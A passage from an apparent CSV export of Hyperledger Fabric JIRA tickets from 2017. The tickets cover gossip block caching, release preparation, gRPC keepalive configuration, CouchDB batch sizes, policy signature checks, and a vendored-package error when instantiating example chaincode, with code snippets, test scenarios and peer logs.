2017-08-07 21:30:14.087 UTC [gossip/state] requestBlocksInRange -> WARN a38 Wasn't able to process state response for blocks [4...4], due to Header.DataHash is different from Hash(block.Data) for block with id [4] on channel [behavesystest];;;","16/Aug/17 11:14 PM;AdnanChoudhury;Thanks for the update [~gennadyl] Upon closer look at the log, came to the same conclusion few hours back, that it is indeed receiving all the blocks from the leader peer (peer0Org2).
 Just a clarification, when you mention that pull mechanism keep in-memory blocks cache, do you mean the cache is in the peer that *has* the blocks, *not* in the peer that requests the pull, right?
 In any case, I would now consider this jira ""working as  expected"" and not a bug. ;;;","16/Aug/17 11:46 PM;AdnanChoudhury;-Let me run some additional test cases to confirm, will update soon.-;;;","17/Aug/17 12:18 AM;gennadyl;Yes, in peer that has the blocks;;;","17/Aug/17 12:20 AM;AdnanChoudhury;[~gennadyl] thanks, Is there a way to know/calculate how many blocks will be in memory?;;;","17/Aug/17 3:42 PM;gennadyl;[~AdnanChoudhury]
Yes, it is possible. The block stay in memory for core.peer.gossip.pullInterval * 100 seconds. In current configuration it set to 400 seconds, but give it some extra time, to make eviction goroutine time to run. In addition, cache has limited capacity - core.peer.gossip.maxBlockCountToStore, now it is 100 blocks. ;;;","18/Aug/17 12:31 AM;AdnanChoudhury;Thanks [~gennadyl];;;","28/Aug/17 11:33 PM;yacovm;can we close this? or - what is the status on this?;;;","28/Aug/17 11:37 PM;AdnanChoudhury;Closing it.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric for 1.0.2 release,FAB-5652,20019,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,08/Aug/17 6:45 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,12/Aug/17 6:39 PM,,,,,,fabric-release,,,,,,0,,,,,,,"Bump version to 1.0.2

Previous version to 1.0.1

is_release = false",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5653,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycaf:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,release-1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric-ca for 1.0.2 release,FAB-5653,20020,19488,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,08/Aug/17 6:46 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,12/Aug/17 6:39 PM,,,,,,fabric-release,,,,,,0,,,,,,,"Bump version to 1.0.2

Previous version to 1.0.1

is_release = false",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5652,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycan:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Side DB - Ledger transaction simulation, validation and commit",FAB-5654,20021,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,08/Aug/17 12:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,16/Aug/17 2:32 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"This JIRA combined the previously opened JIRAs FAB-4978, FAB-4979, and commit part of FAB-4980 in the presence of support for the private data.",,baohua,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycav:",,,,,,,,,,,,,,,,,,,,,,,baohua,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Nov/17 3:55 PM;baohua;https://gerrit.hyperledger.org/r/#/c/12277/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Invalid reference url in the page of ""install & instantiate""",FAB-5655,20022,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,luomin,luomin,luomin,08/Aug/17 2:04 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 2:42 AM,v1.0.0,,,v1.1.0,,fabric-docs,,,,,,0,Documentation,,,,,,"link of [setting up the development environment|http://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.md] at  ""install & instantiate page"" is invalid.

current one is : [http://hyperledger-fabric.readthedocs.io/en/latest/install_instantiate.md]

correct one should be :http://hyperledger-fabric.readthedocs.io/en/latest/dev-setup/devenv.html",,DexHunter,luomin,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycb3:",,,,,,,,,,,,,,,,,,,,,,,DexHunter,luomin,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Sep/17 2:42 AM;markparz;All the above links provided are broken, I search the page referenced and seems this is resolved now, so marking done.;;;","18/Jun/18 11:40 PM;DexHunter;This is broken again. Should end with `.rst` now?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric CA integration with first-network document,FAB-5656,20023,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,kprakashs17a,kprakashs17a,08/Aug/17 2:21 PM,23/Jan/20 6:59 AM,28/Oct/23 3:00 AM,23/Jan/20 6:59 AM,,,,,,,,,,,,0,stale-item,,,,,,"I am looking for adding new peers to existing examples like fabcar and first-network via fabric-ca. Is there a step by step document which can help me adding new peers and orgs. also, if i have to connect to two different machines/nodes where all i have make changes. It would be nice if there is document for the same.",,kprakashs17a,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycbb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kprakashs17a,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:59 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make chaincode accesscontrol use BCCSP,FAB-5657,20024,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,08/Aug/17 5:18 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Aug/17 6:40 PM,v1.1.0,,,v1.1.0,,fabric-crypto,,,,,,0,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycbj:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make gRPC keepalive options configurable,FAB-5658,20025,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,shanlusun,shanlusun,08/Aug/17 8:34 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,25/Nov/17 7:48 AM,v1.0.0,,,v1.1.0,,fabric-peer,,,,,14/Aug/17 12:00 AM,0,v1.0,,,,,,"Currently in the fabric v1.0 version the keepalive options of grpc is hardcoded and not exposed to configuration:
{code:java}
// hyperledger\fabric\core\comm\config.go

var (
   // Is the configuration cached?
   configurationCached = false
   // Is TLS enabled
   tlsEnabled bool
   // Max send and receive bytes for grpc clients and servers
   maxRecvMsgSize = 100 * 1024 * 1024
   maxSendMsgSize = 100 * 1024 * 1024
   // Default keepalive options
   keepaliveOptions = KeepaliveOptions{
      ClientKeepaliveTime:    300,  // 5 min
      ClientKeepaliveTimeout: 20,   // 20 sec - gRPC default
      ServerKeepaliveTime:    7200, // 2 hours - gRPC default
      ServerKeepaliveTimeout: 20,   // 20 sec - gRPC default
   }
)
{code}
In our fabric network each peers and orderer needs to go through a LVS proxy which has a strategy to close long time idle connections(around 5 minutes). Actually this is a common strategy in some partner company(which has intent to join our fabric network), their LVS want to release resource for more new connections.

The 'idle' here means there is no any data transferring through this connection. So peer might lose connection to orderer with the keepalive options above, that's why we want to overwrite keepalive options. 

Also seems there is no reconnecting strategy currently, once the peers lose connection to orderer they can't get block broadcast from orderer anymore.

Talked with [~yacovm], even through we have gossips always transmits data between peers once in a while, but we might still have problem between peers and orderer.

 

 

 

 

 ",,shanlusun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,0,7200,Not a security issue,,,,,,,,FAB-4461,,,,,,,,,,,,,,,,FAB-4305,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycbr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,shanlusun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Sep/17 11:35 AM;shanlusun;This is a really important issue now, we got problems on remote peers(Other organizations) which lose connection to Orderer many times. We always need to restart the broken peers again and again to rejoin channel and connect to Orderer. Without a stable network, we can't release a real production. Please help to fix this as soon as possible.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CouchDB bulk updates should allow a configurable max batch size,FAB-5659,20028,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,chris.elder,chris.elder,chris.elder,08/Aug/17 10:35 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,26/Sep/17 10:14 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"CouchDB bulk updates should allow a configurable max batch size.   Http requests with an excessive size could cause failures.

Max batch size should be configurable in core.yaml along with other CouchDB config settings.",,chris.elder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycc7:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,chris.elder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Sep/17 3:17 AM;chris.elder;https://gerrit.hyperledger.org/r/#/c/12255/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unit test revalidation for solo orderer,FAB-5660,20031,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,jyellick,jyellick,08/Aug/17 11:21 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Sep/17 8:59 PM,v1.0.2,,,v1.1.0,,,,,,,,0,,,,,,,,,guoger,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyccf:",,,,,,,,,,,,,,,,,,,,,,,guoger,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Sep/17 12:47 PM;guoger;https://gerrit.hyperledger.org/r/c/13781/;;;","25/Sep/17 12:55 PM;guoger;[~jyellick] [~kchristidis] [~sanchezl] Any thoughts on integration test for this non-deterministic behavior? especially for kafka (do we have integration test for kafka consenter at all?);;;","25/Sep/17 11:21 PM;kchristidis;Let's modify `bootstrap.feature` to test this?

`bddtests/features/bootstrap.feature` holds an integration test for the Kafka-based orderer; uncomment line 388 to see it in action.

I suggestion modifying/expanding/duplicating `bootstrap.feature` to test ND behavior.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add UT to cover coordinator state logic,FAB-5661,20033,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,09/Aug/17 12:33 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Aug/17 10:06 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,"FAB-5535 introduced coordinator to mediate between state transfer and committer and keep track on missing private collections to provide and ability atomically commit ledger block and relevant private collections. 

There is a need to cover basic replication path sending blocks between two peers making sure we can do it in presence of private data.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyccn:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
check duplicated signatures when evaluating policies,FAB-5662,20035,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xixuejia,xixuejia,xixuejia,09/Aug/17 12:40 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Aug/17 6:46 PM,v1.0.0,,,Abandoned,,fabric-peer,,,,,,0,,,,,,,"Regarding to [comments|https://jira.hyperledger.org/browse/FAB-4252?focusedCommentId=26251&page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#comment-26251] in FAB-4252, the fix for FAB-4252 was doing the check when evaluating endorsement policy and it leaves out the same issue for other policies evaluation, like system related policies, instantiate policy, etc...

A more reasonable fix should do the check at policy evaluation level so that all policies evaluation could reuse this security check",,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4252,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyccv:",,,,,,,,,,,,,,,,,,,,,,,xixuejia,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Aug/17 6:22 PM;xixuejia;https://gerrit.hyperledger.org/r/#/c/12273/;;;","09/Aug/17 6:47 PM;xixuejia;implementing in https://jira.hyperledger.org/browse/FAB-5558;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Unable to instantiate example04 and example05 chaincode - ""use of vendored package not allowed""",FAB-5663,20036,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,latitiah,latitiah,09/Aug/17 1:02 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Oct/17 8:16 AM,v1.0.1,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"*Fabric Commit:* d788450
*Chaincode Commit:* 7a480cec898f89d2e41c4a3ddb70f4124d922374
*API:* cli

When attempting to instantiate example04 and example05 chaincode using the CLI, the following error is received:

{code:None}
Error: Error endorsing chaincode: rpc error: code = Unknown desc = Error starting container: Failed to generate platform-specific docker build: Error returned from build: 1 ""package github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example05
      	imports github.com/hyperledger/fabric/core/chaincode/shim
      	imports github.com/hyperledger/fabric/core/comm
      	imports google.golang.org/grpc
      	imports google.golang.org/grpc/status
      	imports google.golang.org/genproto/googleapis/rpc/status
      	imports github.com/golang/protobuf/ptypes/any
      	imports github.com/golang/protobuf/proto: use of vendored package not allowed
      package github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example05
      	imports github.com/hyperledger/fabric/core/chaincode/shim
      	imports github.com/hyperledger/fabric/common/ledger
      	imports github.com/hyperledger/fabric/protos/common
      	imports github.com/hyperledger/fabric/common/util
      	imports github.com/golang/protobuf/ptypes/timestamp: use of vendored package not allowed
{code}

This worked in previous versions using the system behave framework.",,Hangyu_FJH,latitiah,muralisr,Nishi,Ratnakar,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7608,,,,,,,,,,,,"28/Sep/17 12:33 AM;Ratnakar;peer-logs.txt;https://jira.hyperledger.org/secure/attachment/12146/peer-logs.txt",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycd3:",,,,,,,,,,,,,,,,,,,,,,,Hangyu_FJH,latitiah,muralisr,Nishi,Ratnakar,scottz,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,main,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,mergify/bp/release-2.2/pr-4374,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,true,"09/Aug/17 1:04 AM;latitiah;One of the failing scenarios:
{code:None}
Scenario: FAB-3509: Test chaincode calling chaincode - fabric/examples/chaincode_example04
    Given I have a bootstrapped fabric network of type kafka
    And I wait ""60"" seconds
    When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example04"" with [""init"",""Event"",""1""] with name ""myex04""
    And I wait ""30"" seconds
    Then the chaincode is deployed
    When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02"" with [""init"",""a"",""1000"",""b"",""2000""] with name ""myex02_a"" on channel ""channel2""
    And I wait ""30"" seconds
    Then the chaincode is deployed
    When a user queries on the chaincode named ""myex02_a"" on channel ""channel2"" with args [""query"",""a""]
    Then a user receives a success response of 1000
    When a user queries on the chaincode named ""myex04"" with args [""query"",""Event"", ""myex02_a"", ""a"", ""channel2""]
    Then a user receives a success response of 1000
{code}

(executed using code located in CR: https://gerrit.hyperledger.org/r/#/c/10961/ );;;","09/Aug/17 2:31 AM;latitiah;Failing scenarios when executing system behave tests:
  chaincodes.feature:39  FAB-3509: Test chaincode calling chaincode - fabric/examples/chaincode_example04
  chaincodes.feature:55  FAB-3510-1: Test chaincode calling chaincode - fabric/examples/chaincode_example05
  chaincodes.feature:71  FAB-3510-2: Test chaincode calling chaincode - fabric/examples/chaincode_example05

Steps: 
1. checkout code located in CR https://gerrit.hyperledger.org/r/#/c/10961/ 
2. go to /path/to/fabric/test/feature
3. type ""behave chaincodes.feature"" (you must have behave installed using python 2.7 with prereqs - see README in directory);;;","10/Sep/17 1:17 AM;muralisr;[~latitiah] Vendoring example04 and example05 solves this.

so 

{code:java}
cd examples/chaincode/go/chaincode_example04
govendor init
govendor add +external
{code}


and

{code:java}
cd examples/chaincode/go/chaincode_example05
govendor init
govendor add +external
{code}

I'll provide a CR with this fix soon.;;;","13/Sep/17 4:09 AM;muralisr;Assigning to [~Nishi] ;;;","13/Sep/17 4:18 AM;muralisr;a misunderstanding... assigning it back to self.;;;","24/Sep/17 4:49 AM;scottz;We tagged some Behave tests that are failing in fabric-test repo, so (per Latitia's earlier instructions) we can use them to verify this issue by executing:

behave -n FAB-5663

 ;;;","28/Sep/17 12:34 AM;Ratnakar;[~muralisr]

I ran this with e2e_cli setup and I do see the following errors in [^peer-logs.txt] on commit level *42da28ddc897d40804c5c009ebe9c683cdb7a82d*

 
{code:java}
2017-09-27 15:08:22.152 UTC [chaincode] 2 -> ERRO 950 [06162488] C-call-C mycc02 on channel mychannel1 failed check ACL [proposal_bytes:""\n\221\007\nc\010\003\032\013\010\346\375\256\316\005\020\351\367\220G\""\004xyz2*@06162488c56d3bac0a2118c9f2f8c5d525742ba06f7edcdcfa1f8d7bd561bd17:\n\022\010\022\006mycc05\022\251\006\n\214\006\n\007Org2MSP\022\200\006-----BEGIN -----\nMIICGjCCAcCgAwIBAgIRAKJMBejdYnNJ3k2+AGK7wTowCgYIKoZIzj0EAwIwczEL\nMAkGA1UEBhMCVVMxEzARBgNVBAgTCkNhbGlmb3JuaWExFjAUBgNVBAcTDVNhbiBG\ncmFuY2lzY28xGTAXBgNVBAoTEG9yZzIuZXhhbXBsZS5jb20xHDAaBgNVBAMTE2Nh\nLm9yZzIuZXhhbXBsZS5jb20wHhcNMTcwOTI3MTUwMTI1WhcNMjcwOTI1MTUwMTI1\nWjBbMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMN\nU2FuIEZyYW5jaXNjbzEfMB0GA1UEAwwWQWRtaW5Ab3JnMi5leGFtcGxlLmNvbTBZ\nMBMGByqGSM49AgEGCCqGSM49AwEHA0IABEIADK+B96l1kIpZX1Ad4ai8b3/ezH+N\nmCFP6uPkimXsL6Q+fq1pAS95jBGNnxWHFftV1ycUfEguGXww32OCNq+jTTBLMA4G\nA1UdDwEB/wQEAwIHgDAMBgNVHRMBAf8EAjAAMCsGA1UdIwQkMCKAILHulxpw3DtO\niiCRIUnbB8/X1JDMRmnWyQA8a21CUmrJMAoGCCqGSM49BAMCA0gAMEUCIQCC/VlU\nQyP1NsiqmCVRypuExj1AiI9jTSwnBZXgxgW1OgIgLVxz3DNvb3u+cZhRbCjRQf+D\nfe8RMt9nrOhXlEguSAg=\n-----END -----\n\022\030\253\214\245\366O(U\273\260&\200k\036\356\247\275\220\320K(X*\210M\0222\n0\n.\010\001\022\010\022\006mycc05\032 \n\005query\n\006mycc02\n\003sum\n\nmychannel1"" signature:""0D\002 $\313\\\250\257\""c\2430&\021\232\346K\310!\363\\O\\@\210\326\275%O\202\237\202\324\233\375\002 o\260C\240\317\346\007z\025\257\355\360bR5\306\270\234\217`CH\345\231\335\371\023b4\264\\\324"" ]: [Failed to get policy manager for channel [mychannel1]]
2017-09-27 15:08:22.152 UTC [chaincode] 1 -> DEBU 951 [06162488]enterBusyState trigger event ERROR
2017-09-27 15:08:22.152 UTC [chaincode] processStream -> DEBU 952 [06162488]Move state message ERROR
2017-09-27 15:08:22.152 UTC [chaincode] HandleMessage -> DEBU 953 [06162488]Fabric side Handling ChaincodeMessage of type: ERROR in state ready
2017-09-27 15:08:22.152 UTC [chaincode] HandleMessage -> DEBU 954 [06162488c56d3bac0a2118c9f2f8c5d525742ba06f7edcdcfa1f8d7bd561bd17]HandleMessage- COMPLETED. Notify
2017-09-27 15:08:22.153 UTC [chaincode] notify -> DEBU 955 notifying Txid:06162488c56d3bac0a2118c9f2f8c5d525742ba06f7edcdcfa1f8d7bd561bd17
2017-09-27 15:08:22.153 UTC [chaincode] processStream -> DEBU 956 [06162488]sending state message ERROR
2017-09-27 15:08:22.153 UTC [chaincode] Execute -> DEBU 957 Exit
2017-09-27 15:08:22.153 UTC [chaincode] ExecuteChaincode -> ERRO 958 Error executing chaincode: transaction returned with failure: Failed to get policy manager for channel [mychannel1]
2017-09-27 15:08:22.153 UTC [endorser] callChaincode -> DEBU 959 Exit
2017-09-27 15:08:22.153 UTC [endorser] simulateProposal -> ERRO 95a failed to invoke chaincode name:""mycc05"" on transaction 06162488c56d3bac0a2118c9f2f8c5d525742ba06f7edcdcfa1f8d7bd561bd17, error: transaction returned with failure: Failed to get policy manager for channel [mychannel1]
github.com/hyperledger/fabric/core/chaincode.Execute
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/exectransaction.go:83
github.com/hyperledger/fabric/core/chaincode.ExecuteChaincode
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/chaincodeexec.go:85
github.com/hyperledger/fabric/core/endorser.(*Endorser).callChaincode
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:125
github.com/hyperledger/fabric/core/endorser.(*Endorser).simulateProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:265
github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:480
github.com/hyperledger/fabric/core/handlers/auth.(*filter).ProcessProposal
 /opt/gopath/src/github.com/hyperledger/fabric/core/handlers/auth/auth.go:38
github.com/hyperledger/fabric/protos/peer._Endorser_ProcessProposal_Handler
 /opt/gopath/src/github.com/hyperledger/fabric/protos/peer/peer.pb.go:112
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC
 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:781
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream
 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:981
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1
 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:551
runtime.goexit
 /opt/go/src/runtime/asm_amd64.s:2337
error executing chaincode
{code}
 

Do we need to make specific changed to avoid these ACL errors ?;;;","28/Sep/17 8:55 PM;muralisr;[~Ratnakar] I believe what you are seeing is the result of Serviceability work from [~wlahti] where stack traces are dumped with errors. 

